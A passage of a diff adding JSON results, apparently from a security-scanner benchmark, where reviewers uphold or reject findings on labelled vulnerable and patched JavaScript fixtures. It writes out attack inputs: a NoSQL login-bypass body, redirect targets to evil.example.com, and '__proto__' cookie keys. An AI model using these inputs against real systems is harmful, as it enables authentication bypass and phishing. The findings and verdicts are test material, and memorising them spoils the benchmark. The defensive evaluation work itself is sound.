+          "file": "src/ssrf_positive.js",
+          "hit": true,
+          "line": 4,
+          "remediation": "Validate and restrict the target URL before fetching: enforce an allowlist of permitted domains/hosts, restrict to https scheme only, resolve the hostname and reject private/loopback/link-local/metadata IP ranges (10.0.0.0/8, 172.16.0.0/12, 192.168.0.0/16, 127.0.0.0/8, 169.254.0.0/16, ::1, fc00::/7, etc.), disable redirects or re-validate the final URL after redirects, and consider proxying the request through a dedicated egress service with strict network-level controls (e.g., a firewall that blocks requests to internal address space).",
+          "severity": "high",
+          "title": "Server-Side Request Forgery via unvalidated user-supplied URL",
+          "verdict": {
+            "confidence": "high",
+            "context_that_would_change_this": "Seeing all call sites of fetchAvatar: if every caller enforces a strict allowlist / rejects private IPs and non-HTTP schemes before invoking it, exploitability would be reduced (though exporting an unguarded SSRF primitive would still be a defect). Also relevant would be any deployment config (egress firewall, blocked link-local ranges) that constrains outbound requests at the network layer.",
+            "rationale": "The exported function passes a user-controlled parameter (literally named userUrl) directly into fetch() with zero validation: no scheme restriction, no host/IP allowlist, no private-range or metadata-endpoint filtering. No fetch implementation (global fetch, undici, node-fetch) imposes target restrictions, so no framework guarantee neutralizes the flow. The source-to-sink path (user URL -> fetch) is complete and unguarded, matching CWE-918 exactly. I could find no parameterization, validation, or intentional safe pattern to disprove the finding.",
+            "upheld": true
+          }
+        }
+      ]
+    },
+    {
+      "context_provided": false,
+      "cwe": "CWE-798",
+      "generator_only": [
+        {
+          "confidence": "medium",
+          "cwe": "CWE-798",
+          "description": "The file defines a constant API_TOKEN with a hardcoded secret value directly in source code and uses it to construct an ApiClient. Hardcoded credentials committed to version control can be exposed to anyone with repository access (including forks, CI logs, or public leaks), and cannot be rotated without a code change/deploy. Even though this instance is labeled as an example/placeholder, the pattern itself is the vulnerability being flagged (CWE-798: Use of Hard-coded Credentials), and if a real token were substituted using this same pattern it would be immediately compromised.",
+          "file": "src/hardcoded_secret_positive.js",
+          "hit": true,
+          "line": 4,
+          "remediation": "Load secrets from environment variables, a secrets manager, or a secure vault at runtime (e.g., process.env.API_TOKEN) rather than embedding them in source. Ensure no real secrets are ever committed; add secret-scanning to CI and rotate any credential that was ever hardcoded.",
+          "severity": "high",
+          "title": "Hardcoded API credential/token in source code"
+        }
+      ],
+      "id": "js-hardcoded-secret-positive",
+      "is_vulnerable": true,
+      "rejected": [],
+      "upheld": [
+        {
+          "confidence": "medium",
+          "cwe": "CWE-798",
+          "description": "The file defines a constant API_TOKEN with a hardcoded secret value directly in source code and uses it to construct an ApiClient. Hardcoded credentials committed to version control can be exposed to anyone with repository access (including forks, CI logs, or public leaks), and cannot be rotated without a code change/deploy. Even though this instance is labeled as an example/placeholder, the pattern itself is the vulnerability being flagged (CWE-798: Use of Hard-coded Credentials), and if a real token were substituted using this same pattern it would be immediately compromised.",
+          "file": "src/hardcoded_secret_positive.js",
+          "hit": true,
+          "line": 4,
+          "remediation": "Load secrets from environment variables, a secrets manager, or a secure vault at runtime (e.g., process.env.API_TOKEN) rather than embedding them in source. Ensure no real secrets are ever committed; add secret-scanning to CI and rotate any credential that was ever hardcoded.",
+          "severity": "high",
+          "title": "Hardcoded API credential/token in source code",
+          "verdict": {
+            "confidence": "medium",
+            "context_that_would_change_this": "Confirmation of whether this file is part of a test-fixtures / security-scanner-benchmark directory (which the filename and comment strongly imply). If so, it is working-as-intended sample data and should be suppressed/allowlisted rather than remediated. Conversely, the definition of `./apiClient` and whether `ApiClient` ever treats the first arg as a fallback/overridable default would refine severity, but would not change that the literal is hardcoded. The decisive factor is repo intent: production code vs. detector fixture.",
+            "rationale": "The code pattern is exactly as described: a module-level constant `API_TOKEN` is assigned a string literal and passed into `new ApiClient(...)`. This is a textbook instance of CWE-798 (Use of Hard-coded Credentials), and I cannot disprove it via parameterization, env-var injection, validation, or framework guarantees \u2014 there is no `process.env`, no config lookup, no secrets-manager call. The credential is literally in source and would be committed to version control.\n\nHowever, two mitigating facts prevent full confidence that this is a *real, exploitable* secret: (1) the filename is `hardcoded_secret_positive.js` and the inline comment explicitly states it is a \"Labeled positive (CWE-798)\" example \u2014 i.e., this is almost certainly an intentional test/fixture file designed to trigger exactly this detector, not production code. (2) The token value itself is the literal string `EXAMPLE-do-not-use-hardcoded-token-...`, which is not a valid credential for any real service, so there is no actual secret exposure or rotation risk here.\n\nThe finding's author already conceded this is a placeholder and correctly reframed the issue as \"the pattern is the vulnerability.\" On the merits of pattern detection, that reasoning holds and the finding is technically accurate. I uphold it, but note it is a demonstration/fixture positive rather than a live-secret incident \u2014 triage priority should reflect that the value is non-sensitive.",
+            "upheld": true
+          }
+        }
+      ]
+    },
+    {
+      "context_provided": false,
+      "cwe": "CWE-943",
+      "generator_only": [
+        {
+          "confidence": "medium",
+          "cwe": "CWE-943",
+          "description": "The login function passes req.body.username and req.body.password directly into users.findOne() without type-checking or sanitization. Since MongoDB query fields can accept operator objects (e.g. {\"$ne\": null}, {\"$gt\": \"\"}, {\"$regex\": \".*\"}), an attacker can submit a JSON body like {\"username\": {\"$ne\": null}, \"password\": {\"$ne\": null}} to bypass authentication entirely, matching any user in the collection. This is a classic NoSQL injection / authentication bypass (CWE-943: Improper Neutralization of Special Elements in Data Query Logic, related to CWE-287 Improper Authentication).",
+          "file": "src/nosql_injection_positive.js",
+          "hit": true,
+          "line": 4,
+          "remediation": "Validate and coerce input types before using them in queries: reject or stringify non-string values for username/password (e.g., if (typeof req.body.username !== 'string' || typeof req.body.password !== 'string') return error). Use a schema validation library (e.g., Joi, Zod) to enforce expected types. Avoid building Mongo query objects directly from raw user input; consider using the mongo-sanitize library or explicitly constructing the query with only primitive, validated values. Additionally, passwords should never be compared via findOne in plaintext\u2014use a hashed password comparison (bcrypt.compare) after looking up the user by username alone.",
+          "severity": "critical",
+          "title": "NoSQL injection via unsanitized request body in MongoDB query"
+        }
+      ],
+      "id": "js-nosql-injection-positive",
+      "is_vulnerable": true,
+      "rejected": [],
+      "upheld": [
+        {
+          "confidence": "high",
+          "cwe": "CWE-943",
+          "description": "The login function passes req.body.username and req.body.password directly into users.findOne() without type-checking or sanitization. Since MongoDB query fields can accept operator objects (e.g. {\"$ne\": null}, {\"$gt\": \"\"}, {\"$regex\": \".*\"}), an attacker can submit a JSON body like {\"username\": {\"$ne\": null}, \"password\": {\"$ne\": null}} to bypass authentication entirely, matching any user in the collection. This is a classic NoSQL injection / authentication bypass (CWE-943: Improper Neutralization of Special Elements in Data Query Logic, related to CWE-287 Improper Authentication).",
+          "file": "src/nosql_injection_positive.js",
+          "hit": true,
+          "line": 4,
+          "remediation": "Validate and coerce input types before using them in queries: reject or stringify non-string values for username/password (e.g., if (typeof req.body.username !== 'string' || typeof req.body.password !== 'string') return error). Use a schema validation library (e.g., Joi, Zod) to enforce expected types. Avoid building Mongo query objects directly from raw user input; consider using the mongo-sanitize library or explicitly constructing the query with only primitive, validated values. Additionally, passwords should never be compared via findOne in plaintext\u2014use a hashed password comparison (bcrypt.compare) after looking up the user by username alone.",
+          "severity": "critical",
+          "title": "NoSQL injection via unsanitized request body in MongoDB query",
+          "verdict": {
+            "confidence": "high",
+            "context_that_would_change_this": "The assessment would change if: (1) the caller sanitizes `req.body` upstream (e.g., `mongo-sanitize`, `express-mongo-sanitize`, or a Joi/Zod schema that coerces to strings) before invoking `login`; (2) the `users` object is a custom repository whose `findOne` casts values to strings rather than a raw Mongo collection/Mongoose model; or (3) body parsing is configured to reject nested objects. None of these are visible in the provided diff, and the file is a new standalone module, so no such guards are in scope.",
+            "rationale": "I tried to disprove this and could not. The diff is a complete, self-contained function with no mitigating logic: `req.body.username` and `req.body.password` flow unmodified into `users.findOne({ username, password })`. There is no `typeof` guard, no cast to String, no schema validation, and no sanitization middleware visible. The `users` object is passed in as a parameter, but the `findOne({ field: value })` call shape is the standard MongoDB driver/Mongoose query API, which interprets a value like `{\"$ne\": null}` as an operator rather than an equality match. With Express's default `express.json()` body parser, `req.body` can contain nested objects, so `{\"username\":{\"$ne\":null},\"password\":{\"$ne\":null}}` is attacker-reachable and would match an arbitrary user, bypassing authentication (and the password check is also plaintext-compared, compounding the issue). The filename and inline comment even self-label this as an intentional positive example. Nothing in the parameterization or framework behavior saves it. CWE-943 is correctly assigned.",
+            "upheld": true
+          }
+        }
+      ]
+    },
+    {
+      "context_provided": false,
+      "cwe": "CWE-601",
+      "generator_only": [
+        {
+          "confidence": "medium",
+          "cwe": "CWE-601",
+          "description": "The redirect() function passes req.query.next directly to res.redirect() without any validation, sanitization, or allow-listing. An attacker can craft a URL such as /path?next=https://evil.example.com to redirect victims to an arbitrary external site, enabling phishing, credential theft, or malware distribution via a trusted domain. Additionally, protocol-relative URLs (//evil.com) or javascript: URIs could be supplied, depending on how the framework/browser handles the redirect value.",
+          "file": "src/open_redirect_positive.js",
+          "hit": true,
+          "line": 4,
+          "remediation": "Validate the redirect target against an allow-list of known safe paths/domains before calling res.redirect(). Prefer using relative paths only (reject any value containing '://' or starting with '//'), or map an opaque key to a server-side list of permitted destinations instead of trusting user input directly.",
+          "severity": "high",
+          "title": "Open redirect via unvalidated req.query.next"
+        }
+      ],
+      "id": "js-open-redirect-positive",
+      "is_vulnerable": true,
+      "rejected": [],
+      "upheld": [
+        {
+          "confidence": "high",
+          "cwe": "CWE-601",
+          "description": "The redirect() function passes req.query.next directly to res.redirect() without any validation, sanitization, or allow-listing. An attacker can craft a URL such as /path?next=https://evil.example.com to redirect victims to an arbitrary external site, enabling phishing, credential theft, or malware distribution via a trusted domain. Additionally, protocol-relative URLs (//evil.com) or javascript: URIs could be supplied, depending on how the framework/browser handles the redirect value.",
+          "file": "src/open_redirect_positive.js",
+          "hit": true,
+          "line": 4,
+          "remediation": "Validate the redirect target against an allow-list of known safe paths/domains before calling res.redirect(). Prefer using relative paths only (reject any value containing '://' or starting with '//'), or map an opaque key to a server-side list of permitted destinations instead of trusting user input directly.",
+          "severity": "high",
+          "title": "Open redirect via unvalidated req.query.next",
+          "verdict": {
+            "confidence": "high",
+            "context_that_would_change_this": "Only two things could flip this, and neither appears: (1) a non-standard `res` object whose `redirect` method internally validates/allow-lists the target host, or (2) middleware that rewrites/validates `req.query.next` before this handler runs AND guarantees the value is safe. Seeing the router registration, any custom response wrapper definition, or upstream middleware config would confirm or adjust the assessment.",
+            "rationale": "The single line `res.redirect(req.query.next)` passes user-controlled query input directly into the redirect sink with no allow-list, host check, URL parsing, prefix guard, or sanitization. Express's res.redirect() offers no open-redirect protection and will honor absolute, protocol-relative (//evil.com), and arbitrary-host targets, so no framework guarantee rescues this. The source\u2192sink flow is complete and unguarded exactly as the finding describes, matching CWE-601. An upstream wrapper cannot mitigate it because the sink consumes req.query.next directly rather than a pre-validated argument. The file/comment even self-label it as an intentional true positive. No parameterization or design pattern disproves the finding.",
+            "upheld": true
+          }
+        }
+      ]
+    },
+    {
+      "context_provided": false,
+      "cwe": "CWE-1333",
+      "generator_only": [
+        {
+          "confidence": "medium",
+          "cwe": "CWE-116",
+          "description": "This module reproduces the well-known `ansi-regex` package used by tools like `strip-ansi` to strip ANSI escape sequences from strings before logging, displaying in a terminal, or rendering elsewhere. The character class in the second alternation is `[\\dA-PRZcf-ntqry=><~]`, which omits the `-TZ` range present in the canonical, security-reviewed pattern (`[\\dA-PR-TZcf-ntqry=><~]`). If this regex is relied upon as a sanitization/stripping mechanism for untrusted input (e.g., removing terminal control sequences before writing to a log file or terminal), the narrowed character class means certain valid ANSI final bytes will not be matched and therefore will not be stripped. An attacker who controls input that is later processed with this regex could craft escape sequences using the unmatched final bytes to bypass the filter, resulting in terminal escape sequence injection (e.g., manipulating terminal title, cursor, or triggering OSC-based attacks in vulnerable terminal emulators) or log injection/log forging.",
+          "file": "index.js",
+          "hit": false,
+          "line": null,
+          "remediation": "Use the exact, security-reviewed regex from the upstream `ansi-regex` package without modification, or add test vectors covering the full range of ANSI CSI/OSC final bytes to confirm no escape sequences slip through the filter. Treat any divergence from the canonical pattern as a potential sanitization bypass and review before use in security-sensitive contexts (log sanitization, terminal output scrubbing, etc.).",
+          "severity": "medium",
+          "title": "Regex character class differs from the vetted ansi-regex pattern, risking incomplete ANSI/escape-sequence stripping"
+        },
+        {
+          "confidence": "low",
+          "cwe": "CWE-1333",
+          "description": "The exported function returns a global regex built from nested quantifiers (`[a-zA-Z\\d]*(?:;[a-zA-Z\\d]*)*` and `\\d{1,4}(?:;\\d{0,4})*`). While this specific construction resembles the patched (post-CVE-2021-3807) version of ansi-regex rather than the originally vulnerable one, regexes of this shape have a history of catastrophic-backtracking issues when the library is misused or when future edits reintroduce ambiguity (e.g., the original `ansi-regex` ReDoS, CVE-2021-3807, stemmed from a very similar pattern). Since this code is likely consumed by other modules to scan potentially attacker-controlled strings (titles, user input, log lines) with the `g` flag over the whole string, any regression toward the vulnerable pattern or use on very large adversarial strings could cause excessive CPU consumption (denial of service).",
+          "file": "index.js",
+          "hit": true,
+          "line": null,
+          "remediation": "Pin/verify against the upstream patched ansi-regex pattern exactly, add regression tests with adversarial inputs (long runs of digits/semicolons) to measure worst-case execution time, and consider bounding input length before applying the regex to untrusted data.",
+          "severity": "low",
+          "title": "Potential ReDoS exposure from unbounded, attacker-controlled input passed to a complex alternation regex"
+        }
+      ],
+      "id": "cve-2021-3807-ansi-regex-positive",
+      "is_vulnerable": true,
+      "rejected": [
+        {
+          "confidence": "low",
+          "cwe": "CWE-116",
+          "description": "This module reproduces the well-known `ansi-regex` package used by tools like `strip-ansi` to strip ANSI escape sequences from strings before logging, displaying in a terminal, or rendering elsewhere. The character class in the second alternation is `[\\dA-PRZcf-ntqry=><~]`, which omits the `-TZ` range present in the canonical, security-reviewed pattern (`[\\dA-PR-TZcf-ntqry=><~]`). If this regex is relied upon as a sanitization/stripping mechanism for untrusted input (e.g., removing terminal control sequences before writing to a log file or terminal), the narrowed character class means certain valid ANSI final bytes will not be matched and therefore will not be stripped. An attacker who controls input that is later processed with this regex could craft escape sequences using the unmatched final bytes to bypass the filter, resulting in terminal escape sequence injection (e.g., manipulating terminal title, cursor, or triggering OSC-based attacks in vulnerable terminal emulators) or log injection/log forging.",
+          "file": "index.js",
+          "hit": false,
+          "line": null,
+          "remediation": "Use the exact, security-reviewed regex from the upstream `ansi-regex` package without modification, or add test vectors covering the full range of ANSI CSI/OSC final bytes to confirm no escape sequences slip through the filter. Treat any divergence from the canonical pattern as a potential sanitization bypass and review before use in security-sensitive contexts (log sanitization, terminal output scrubbing, etc.).",
+          "severity": "medium",
+          "title": "Regex character class differs from the vetted ansi-regex pattern, risking incomplete ANSI/escape-sequence stripping",
+          "verdict": {
+            "confidence": "low",
+            "context_that_would_change_this": "A call site where this regex's output is relied upon as the sole security boundary for stripping control sequences from attacker-controlled input before writing to a terminal/log, PLUS a demonstration that an ESC[...S or ESC[...T sequence (or a crafted sequence whose final byte is S/T) enables a concrete injection (e.g., smuggling a dangerous payload a vulnerable emulator acts on). Also relevant: whether downstream code expects the newer ansi-regex contract. Absent that, this is a benign version lag, not a vulnerability.",
+            "rationale": "The factual claim (character class omits S and T relative to current ansi-regex) is correct, but the security conclusion does not hold. The module is byte-for-byte ansi-regex v3.0.0 \u2014 itself a vetted pattern; the R-T widening was a v4 feature addition for two extra CSI final bytes, not a security fix (the real ansi-regex CVE-2021-3807 was an unrelated ReDoS). The only unmatched bytes, S/T, are benign Scroll Up/Down CSI commands. The actual terminal-injection vectors the finding invokes \u2014 OSC title/cursor attacks \u2014 travel through the first alternation (ESC...BEL) or the A-P/f-n ranges, all of which remain matched. The module is also just a regex factory with no call site establishing it as a security sanitizer, and ansi-regex is not designed as one (CWE-116 requires use as an escaping/sanitization control). No concrete bypass is demonstrated.",
+            "upheld": false
+          }
+        },
+        {
+          "confidence": "high",
+          "cwe": "CWE-1333",
+          "description": "The exported function returns a global regex built from nested quantifiers (`[a-zA-Z\\d]*(?:;[a-zA-Z\\d]*)*` and `\\d{1,4}(?:;\\d{0,4})*`). While this specific construction resembles the patched (post-CVE-2021-3807) version of ansi-regex rather than the originally vulnerable one, regexes of this shape have a history of catastrophic-backtracking issues when the library is misused or when future edits reintroduce ambiguity (e.g., the original `ansi-regex` ReDoS, CVE-2021-3807, stemmed from a very similar pattern). Since this code is likely consumed by other modules to scan potentially attacker-controlled strings (titles, user input, log lines) with the `g` flag over the whole string, any regression toward the vulnerable pattern or use on very large adversarial strings could cause excessive CPU consumption (denial of service).",
+          "file": "index.js",
+          "hit": true,
+          "line": null,
+          "remediation": "Pin/verify against the upstream patched ansi-regex pattern exactly, add regression tests with adversarial inputs (long runs of digits/semicolons) to measure worst-case execution time, and consider bounding input length before applying the regex to untrusted data.",
+          "severity": "low",
+          "title": "Potential ReDoS exposure from unbounded, attacker-controlled input passed to a complex alternation regex",
+          "verdict": {
+            "confidence": "high",
+            "context_that_would_change_this": "If a later edit or a consuming call site merged `;` into either inner character class (e.g. `[a-zA-Z\\d;]*`), reintroducing separator overlap, the ReDoS would become real. Also relevant would be any evidence the pattern string is dynamically concatenated with attacker-influenced fragments before compilation.",
+            "rationale": "The regex is the patched (post-CVE-2021-3807) ansi-regex pattern, and the finding concedes this. The allegedly dangerous nested quantifiers \u2014 `[a-zA-Z\\d]*(?:;[a-zA-Z\\d]*)*` and `\\d{1,4}(?:;\\d{0,4})*` \u2014 are NOT vulnerable because the repeated character classes are disjoint from the `;` separator. Each input character maps to exactly one engine path, so there is no overlapping alternative to backtrack over; matching is linear time. Catastrophic backtracking requires an ambiguous partition (which the original CVE had by folding `;` into the class, and which the fix removed). The finding's entire case is speculative ('future edits,' 'regression toward the vulnerable pattern,' 'very large strings'), none of which constitutes a vulnerability in the code as written. This is a false positive against the current diff.",
+            "upheld": false
+          }
+        },
+        {
+          "confidence": "high",
+          "cwe": "CWE-400",
+          "description": "Unlike the upstream `ansi-regex` API (which exposes an `onlyFirst` option to return a non-global RegExp), this implementation always returns a regex with the `g` flag and no way to restrict matching to the first occurrence or a bounded input size. Callers that pass large, attacker-controlled strings will always have the full string scanned, which increases exposure to any worst-case regex performance characteristics and makes it easier to introduce DoS by feeding large inputs.",
+          "file": "index.js",
+          "hit": false,
+          "line": null,
+          "remediation": "Expose an option (as in upstream) to control global vs. first-match behavior, and document/enforce reasonable input size limits for callers that process untrusted strings.",
+          "severity": "info",
+          "title": "No option to disable global matching / limit scope, encouraging use on arbitrarily large untrusted strings",
+          "verdict": {
+            "confidence": "high",
+            "context_that_would_change_this": "Evidence that the regex has genuine super-linear/catastrophic backtracking (it does not, given the `;` delimiter), or a concrete call site feeding very large attacker-controlled strings through this in a latency-critical hot loop where even linear cost is exploitable \u2014 though that would be a caller-side performance issue rather than a defect in this diff.",
+            "rationale": "The finding mischaracterizes normal linear string processing as a DoS risk. The regex is the patched (post-CVE-2021-3807) ansi-regex pattern: its only nested quantifier `(?:[a-zA-Z\\d]*(?:;[a-zA-Z\\d]*)*)?` is disambiguated by a literal `;` delimiter that `[a-zA-Z\\d]` cannot match, so there is no catastrophic backtracking \u2014 matching is O(n). The `g` flag merely performs a single linear scan, which is the baseline cost of any string-processing routine and does not constitute uncontrolled/disproportionate resource consumption (CWE-400). The absent `onlyFirst` option is a functional convenience in upstream, not a security/resource-limiting control, and even it would share the same worst case (no-match scans the whole string). Input-size bounding is the caller's responsibility, not a leaf regex factory's. The author's own 'info' severity concedes it is not a genuine vulnerability.",
+            "upheld": false
+          }
+        }
+      ],
+      "upheld": []
+    },
+    {
+      "context_provided": false,
+      "cwe": null,
+      "generator_only": [
+        {
+          "confidence": "medium",
+          "cwe": "CWE-1333",
+          "description": "The exported regular expression is built from a pattern (matching the vulnerable versions of the 'ansi-regex' package, CVE-2021-3807 / GHSA-93q8-gq69-wqmw) that contains nested, overlapping quantifiers in the OSC/BEL-terminated branch: `(?:(?:;[-a-zA-Z\\d\\/#&.:=?%@~_]+)*|[a-zA-Z\\d]+(?:;[a-zA-Z\\d]*)*)?\\u0007`. When this regex is applied (e.g. via String.prototype.replace/match/test) to a long, crafted string that almost\u2014but never fully\u2014matches the terminator sequence (such as a long run of semicolon-separated segments without a trailing BEL character), the regex engine's backtracking becomes super-linear/exponential in the input length. An attacker who can supply input that is later stripped/matched with this regex (e.g. CLI output sanitization, log scrubbing, or any user-controlled string passed through a library using this module) can cause catastrophic backtracking, leading to CPU exhaustion and denial of service in the consuming process (especially dangerous in Node.js servers where it blocks the single-threaded event loop).",
+          "file": "index.js",
+          "hit": false,
+          "line": 5,
+          "remediation": "Upgrade to the fixed version of the pattern (ansi-regex >= 5.0.1 / 6.x) which rewrites the vulnerable alternation to avoid nested unbounded quantifiers, e.g. using a non-backtracking formulation such as `[\\u001B\\u009B][[\\]()#;?]*(?:(?:(?:[a-zA-Z\\d]*(?:;[a-zA-Z\\d]*)*)?\\u0007)|(?:(?:\\d{1,4}(?:;\\d{0,4})*)?[\\dA-PR-TZcf-ntqry=><~]))`. Alternatively, validate/limit the length of untrusted input before running it through this regex, use a safe regex engine with backtracking limits (e.g. `re2`), or add a timeout/size cap around any replace/match/test call that processes attacker-controlled strings.",
+          "severity": "high",
+          "title": "Regular Expression Denial of Service (ReDoS) in ANSI escape code regex"
+        }
+      ],
+      "id": "cve-2021-3807-ansi-regex-negative",
+      "is_vulnerable": false,
+      "rejected": [
+        {
+          "confidence": "high",
+          "cwe": "CWE-1333",
+          "description": "The exported regular expression is built from a pattern (matching the vulnerable versions of the 'ansi-regex' package, CVE-2021-3807 / GHSA-93q8-gq69-wqmw) that contains nested, overlapping quantifiers in the OSC/BEL-terminated branch: `(?:(?:;[-a-zA-Z\\d\\/#&.:=?%@~_]+)*|[a-zA-Z\\d]+(?:;[a-zA-Z\\d]*)*)?\\u0007`. When this regex is applied (e.g. via String.prototype.replace/match/test) to a long, crafted string that almost\u2014but never fully\u2014matches the terminator sequence (such as a long run of semicolon-separated segments without a trailing BEL character), the regex engine's backtracking becomes super-linear/exponential in the input length. An attacker who can supply input that is later stripped/matched with this regex (e.g. CLI output sanitization, log scrubbing, or any user-controlled string passed through a library using this module) can cause catastrophic backtracking, leading to CPU exhaustion and denial of service in the consuming process (especially dangerous in Node.js servers where it blocks the single-threaded event loop).",
+          "file": "index.js",
+          "hit": false,
+          "line": 5,
+          "remediation": "Upgrade to the fixed version of the pattern (ansi-regex >= 5.0.1 / 6.x) which rewrites the vulnerable alternation to avoid nested unbounded quantifiers, e.g. using a non-backtracking formulation such as `[\\u001B\\u009B][[\\]()#;?]*(?:(?:(?:[a-zA-Z\\d]*(?:;[a-zA-Z\\d]*)*)?\\u0007)|(?:(?:\\d{1,4}(?:;\\d{0,4})*)?[\\dA-PR-TZcf-ntqry=><~]))`. Alternatively, validate/limit the length of untrusted input before running it through this regex, use a safe regex engine with backtracking limits (e.g. `re2`), or add a timeout/size cap around any replace/match/test call that processes attacker-controlled strings.",
+          "severity": "high",
+          "title": "Regular Expression Denial of Service (ReDoS) in ANSI escape code regex",
+          "verdict": {
+            "confidence": "high",
+            "context_that_would_change_this": "If my paren/group count from the diff text is wrong \u2014 specifically if the actual pattern has three `(?:` groups (`(?:(?:(?:;`) after the prefix and a single trailing `)` (`=><~])`) \u2014 then it would be the vulnerable 5.0.0 pattern and the finding would hold. An empirical timing test running the compiled regex against a crafted near-match input (e.g. `'\\u001B[' + ';'.repeat(100000)`) would provide direct confirmation, but the exact textual match to the published 5.0.1 patch is already dispositive.",
+            "rationale": "The regex in the diff is a byte-for-byte match with the PATCHED ansi-regex 5.0.1 that fixed CVE-2021-3807, not the vulnerable 5.0.0 version. The distinguishing marker is the group nesting: the patched version has four `(?:` groups after the `[[\\]()#;?]*` prefix (`(?:(?:(?:(?:;`) and ends the second alternative with two closing parens (`=><~]))`), whereas the vulnerable version has only three `(?:` groups and ends with a single paren (`=><~])`). The diff clearly shows `(?:(?:(?:(?:;` and `=><~]))'`, i.e., the fixed structure. The CVE fix was exactly this regrouping, which wraps both alternatives in an outer non-capturing group so each branch requires a terminator (\\u0007 or the mandatory CSI final char-class), eliminating the ambiguous partial-match backtracking. The finding quoted the inner substring `(?:(?:;...)*|[a-zA-Z\\d]+...)?\\u0007` as the vulnerable branch, but that substring exists identically in BOTH versions and is not where the ReDoS lived \u2014 the first-pass analysis keyed on a shared substring and missed the surrounding group structure that constitutes the remediation. The finding effectively flagged the fix itself as the vulnerability.",
+            "upheld": false
+          }
+        }
+      ],
+      "upheld": []
+    },
+    {
+      "context_provided": false,
+      "cwe": "CWE-1321",
+      "generator_only": [
+        {
+          "confidence": "medium",
+          "cwe": "CWE-1321",
+          "description": "putCookie() uses attacker/application-supplied cookie.domain, cookie.path, and cookie.key values directly as property names when building the nested this.idx object (this.idx[cookie.domain][cookie.path][cookie.key] = cookie) without any validation or sanitization (e.g. rejecting '__proto__', 'constructor', 'prototype'). If a cookie with domain/path/key equal to '__proto__' (or similar) is ever stored \u2014 e.g. via a malicious Set-Cookie header processed by an HTTP client using this store \u2014 it can pollute Object.prototype, potentially leading to denial of service or, depending on how polluted properties are later consumed elsewhere in the application, more severe impacts (RCE in some gadget chains). This mirrors a known class of vulnerability in cookie-jar implementations (CWE-1321).",
+          "file": "lib/memstore.js",
+          "hit": true,
+          "line": null,
+          "remediation": "Use Object.create(null) for idx and nested maps, or use a Map instead of plain objects. Additionally validate/reject domain, path, and key values equal to '__proto__', 'constructor', or 'prototype' before indexing, and use Object.hasOwnProperty.call() guards when reading.",
+          "severity": "high",
+          "title": "Prototype pollution via unsanitized cookie.domain/path/key used as object keys"
+        },
+        {
+          "confidence": "medium",
+          "cwe": "CWE-670",
+          "description": "putCookie() calls cb(null) unconditionally and then again returns cb(null), invoking the user-supplied callback twice for a single operation. Depending on how the callback is implemented by the caller (e.g. resolving a promise, writing an HTTP response, decrementing a counter), double invocation can cause logic errors, double-send of responses, or resource exhaustion/DoS in consuming code (CWE-670 / improper control flow).",
+          "file": "lib/memstore.js",
+          "hit": false,
+          "line": null,
+          "remediation": "Ensure the callback is invoked exactly once per call; remove the duplicate cb(null) call and keep only a single 'return cb(null)'.",
+          "severity": "medium",
+          "title": "putCookie invokes the callback twice"
+        },
+        {
+          "confidence": "medium",
+          "cwe": "CWE-532",
+          "description": "The custom inspect implementation (inspectFallback/formatDomain/formatPath) serializes full cookie objects, including their values, into a human-readable string that is invoked automatically whenever the store object is logged or inspected (e.g. via console.log or util.inspect, wired through customInspectSymbol in the constructor). Cookies frequently contain session identifiers or other sensitive tokens; exposing them via default object inspection increases the risk of accidental sensitive-data disclosure into logs, crash dumps, or error reports (CWE-532).",
+          "file": "lib/memstore.js",
+          "hit": false,
+          "line": null,
+          "remediation": "Mask or omit cookie values (or redact session/auth-like cookie names) in the inspect output, or make verbose inspection opt-in rather than automatic.",
+          "severity": "low",
+          "title": "Custom inspect output may leak sensitive cookie data"
+        },
+        {
+          "confidence": "medium",
+          "cwe": "CWE-20",
+          "description": "Methods such as putCookie and removeAllCookies call cb(...) without first checking that cb is actually a function. If an attacker-influenced code path supplies a non-function or omits the callback, this will throw a TypeError, potentially causing unhandled exceptions/crashes in the hosting process (availability impact).",
+          "file": "lib/memstore.js",
+          "hit": false,
+          "line": null,
+          "remediation": "Validate that cb is a function (or provide a default no-op) before invoking it, consistent with defensive coding practices used elsewhere in cookie-store implementations.",
+          "severity": "low",
+          "title": "No validation of callback argument before invocation"
+        }
+      ],
+      "id": "cve-2023-26136-tough-cookie-positive",
+      "is_vulnerable": true,
+      "rejected": [
+        {
+          "confidence": "low",
+          "cwe": "CWE-532",
+          "description": "The custom inspect implementation (inspectFallback/formatDomain/formatPath) serializes full cookie objects, including their values, into a human-readable string that is invoked automatically whenever the store object is logged or inspected (e.g. via console.log or util.inspect, wired through customInspectSymbol in the constructor). Cookies frequently contain session identifiers or other sensitive tokens; exposing them via default object inspection increases the risk of accidental sensitive-data disclosure into logs, crash dumps, or error reports (CWE-532).",
+          "file": "lib/memstore.js",
+          "hit": false,
+          "line": null,
+          "remediation": "Mask or omit cookie values (or redact session/auth-like cookie names) in the inspect output, or make verbose inspection opt-in rather than automatic.",
+          "severity": "low",
+          "title": "Custom inspect output may leak sensitive cookie data",
+          "verdict": {
+            "confidence": "low",
+            "context_that_would_change_this": "1) The definition of Cookie.inspect() \u2014 if the canonical implementation redacts sensitive attributes and this reimplementation bypasses that masking, the finding would be valid. 2) Any call site within the library (not the consuming app) that passes the store/cookies to an actual logger, telemetry, or error-reporting sink automatically \u2014 that would turn this into a genuine CWE-532.",
+            "rationale": "Technically the custom inspect does serialize full cookie values via cookie.inspect(), but this does not constitute a CWE-532 vulnerability in this code. The library performs no logging itself \u2014 the inspect hook only builds a string representation when the host application explicitly calls console.log/util.inspect on the store; routing that to a log sink is the application's choice. Moreover, it does not increase exposure: cookies live in a plain object (this.idx), so default Node inspection would already print every cookie value; the custom formatter is merely a prettier rendering of data that would be shown regardless. Finally, a customInspectSymbol hook that renders a data store's contents is expected, intentional debugging behavior. This is a design characteristic, not an exploitable disclosure.",
+            "upheld": false
+          }
+        },
+        {
+          "confidence": "medium",
+          "cwe": "CWE-20",
+          "description": "Methods such as putCookie and removeAllCookies call cb(...) without first checking that cb is actually a function. If an attacker-influenced code path supplies a non-function or omits the callback, this will throw a TypeError, potentially causing unhandled exceptions/crashes in the hosting process (availability impact).",
+          "file": "lib/memstore.js",
+          "hit": false,
+          "line": null,
+          "remediation": "Validate that cb is a function (or provide a default no-op) before invoking it, consistent with defensive coding practices used elsewhere in cookie-store implementations.",
+          "severity": "low",
+          "title": "No validation of callback argument before invocation",
+          "verdict": {
+            "confidence": "medium",
